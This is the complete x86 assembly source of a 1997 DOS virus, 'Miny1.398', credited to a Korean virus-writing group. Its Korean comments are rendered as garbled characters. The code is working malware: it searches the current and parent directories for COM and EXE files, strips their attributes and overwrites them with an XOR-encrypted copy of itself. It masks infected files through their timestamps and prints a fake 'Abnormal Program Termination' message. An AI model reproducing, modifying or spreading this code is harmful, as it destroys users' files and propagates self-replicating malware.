;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;           Miny1.398                                          CVC #02  97/09
;
;
; Name : Miny1.398
; Original Author : KOV (Knight Of Virus) of SVS (Seoul Virus Society)
; Author : Osiris of CVC,Corea
; Type : Non Resident  Overwriting
;
;
;
; Miny1.432 �a����a�� �����e���a. Miny1.432 �e ���� ���A�� ���a�Q ���� �a��
; �i �q�q ��ǡ�e ���� ���a�w �a�A �e�i���a.
;
; Miny1.397 �e Miny1.432 �� ���A�i �����a�v�a.
;
;  Miny1 �A�� 24h �� ������a�i �a������ �g�e ��a�i Ё�iЖ�a.
;
;  �e�� ���Bɡ���A�� COM �a�� ���� �q�q ��ǡ�a ҁ�A EXE �a���� �q�q��ǥ�a.
;  15 �� ���w �q�q�A���a�e �a����a�a �a���� ���e �A�����i �b�e�a.
;
;  !!!! �w�� !!!!
;
;  �s�a�a�� �a����a���a�� �q�q�E �a���e ���w���� �i �� ���a.
;  �� �a����a�e �a�B�ⷥ ����a���e �a�w�A�ᴡ �a�a �� �a����a�� ���e
;  ���e �����e �a�w�a�A�A ���a.
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>


 Miny1         SEGMENT PARA 'Miny1'
               assume cs:Miny1, ds:Miny1

               Org     100h
 Entry:        call    Decode                   ; �qѡ Ή��

 Encry_Start:
               Mov     byte ptr S_Find,00       ; COM �q�q���a, EXE �q�q���a
               mov     byte ptr Total,00        ; 3�� �q�q
               Mov     dx,offset Com_File       ; ���e COM �a�� �q�q
               mov     byte ptr Infected,00     ; �q�q�E �����i 0 �a�� �e�a.
               Jmp     Virus_Start              ; �a�� �x���� ���a

;=================================================
; �A���� �t �w�b
;

 Vir_Msg       DB ' Miny1 Virus - Bug Fix Version  97/08/14',0Dh,0Ah
               DB ' (c) Copyleft 1997 by Osiris of CVC,Corea',0Dh,0Ah
               DB '$'

 Msg           DB      'Abnormal Program Termination.',0Dh,0Ah,'$'

 ; TBAV ���e ϡ�a��
 Com_File      DB      '*.c?m',00               ; ���e C?M �a��
 Exe_File      DB      '*.e?e',00               ; ���e E?E �a��
 Total         DB      ?                        ; �q�q��ǥ��
 Infected      DB      ?                        ; ���q�a�� �q�q�E �a���i
 S_Find        DB      ?                        ; �q�q��ǡ�� ���e �wȁ
 UP            DB      '..',00                  ; �w�ᝡ ����

 Virus_Start:
               xor     ax,ax
               mov     ds,ax
               push    DS:[0090h]               ; Int 24h �t ��w
               Push    DS:[0092h]

               mov     DS:[0090h],offset NewInt24
               mov     DS:[0092h],cs            ; Int 24h �a����

               Push    CS                       ; cs=ds
               Pop     DS

 Find_File:
               Mov     ah,4Eh
               Mov     cx,00100011B             ; �a�� ����
 Find:         Int     21h
               Jc      Find_EXE                 ; �A��?
 ChkInfect:
               mov     ax, DS:[0080h+1Eh]
               cmp     ax,'OC'                  ; COMMAND.COM ���a ?
               jz      Find_NEXT                ; �q�q �A�A
               Mov     al, DS:[0080h+22]        ; �q�q �a�� ��a
               And     al,1Fh                   ; �q�q�A���a ?
               Cmp     al,1Fh                   ; (62�� ���a ?)
               Jnz     InfectFile
               inc     byte ptr INFECTED        ; �q�q�E �a��
 Find_NEXT:
               Mov     ah,4Fh                   ; �a�q �a�� ��a
               JMP     Find                     ;

 InfectFile:
               mov     ax,4301h                 ; �����i ����/�a���� �e�e�a.
               xor     cx,cx                    ; DTA �a 0080h ���� ���b�a�a��
               mov     dx,0080h+1eh
               int     21h

               mov     ax,3D02h                 ; ���e/�a���� ���e
               int     21h

               xchg    ax,bx                    ; AX �A Ѕ�i ����
               mov     ax,5700h                 ; ���e �苡
               int     21h
               push    cx
               push    dx

               xor     ax,ax                    ; ������ ���e �苡 (�qѡ��
               mov     es,ax                    ; �A �a�w)
               mov     al,byte ptr ES:[046Ch]   ; 0000:046Ch
               Push    CS                       ;
               Pop     ES                       ;
               mov     Key_Value,al             ; Key_Value = �qѡǡ �t
               call    Write_Vir                ; �a����a �a�� ѡ

               pop     dx                       ; ���e ����
               pop     cx
               or      cx,+1Fh                  ; ���i 62�� �� �a��
               mov     ax,5701h                 ; ���e ����(���� ���e)
               int     21h

               mov     ah,3eh                   ; �a�� �h��
               Int     21h
               cmp     byte ptr Total,3         ; 3�� �q�q���v�a?
               jz      Stop_Virus
               Inc     byte ptr Total           ; 1 �w�a
               JMP     Find_NEXT
 Find_EXE:
               cmp     byte ptr S_Find,1        ; 01���e EXE �a���� �q�q���v�a.
               Jnz     DX_EXE
               mov     dx, offset UP            ; �w�� ���Bɡ���� ����
               mov     ah,3Bh
               Int     21h
               jc      Stop_Virus               ; ���a ���Bɡ�� ���a ?
               mov     byte ptr S_Find,00       ; COM �a�� ���� �q�q
               mov     dx, offset COM_File
               jmp     Find_File
 DX_EXE:
               Mov     byte ptr S_Find,01       ; EXE �a���i �q�q���a�a.
               Mov     dx,offset Exe_File       ;
               Jmp     Find_File

 Stop_Virus:
               xor     ax,ax                    ; ���� Int 24h �� �a��
               mov     ds,ax
               pop     DS:[0092h]
               pop     DS:[0090h]
               Push    CS
               Pop     DS
               mov     dx, offset Msg           ; ���w�ⷥ �A�ᝡ �a�w
               cmp     byte ptr Infected,15     ; 15�� �q�q���v�a�e �A����
               jb      PrtMsg
               mov     dx, offset Vir_Msg
 PrtMsg:       mov     ah,9                     ; �A���� �b
               Int     21h

               Mov     ah,4Ch                   ; �a����a ���a
               int     21h

 NewInt24:                                      ; Int 24h �១
               xor     al,al
               IRET

 End_Encry:

;==================================================
;   �a����a �qѡ�� ����
;
 Write_Vir:    call    Decode                   ; �qѡ
               mov     ah,40h                   ; �a����a �a��
               mov     dx, 100h
               mov     cx, offset Vir_END - 100h;
               Int     21h
               call    Decode                   ; �qѡ Ё�A
               RET
 Key_Value     DB      ?

 Decode:
               mov     si, 103h                 ; �qѡ ���b��
               mov     di,si
               mov     ah,Key_value             ; �qѡ ǡ�t
               mov     cx, offset End_Encry - 103h
 E_Ing:
               lodsb                            ; �qѡ��
               xor     al,ah
               stosb
               loop    E_ing
               RET
 Vir_END:

 Miny1         ENDS
               END     Entry
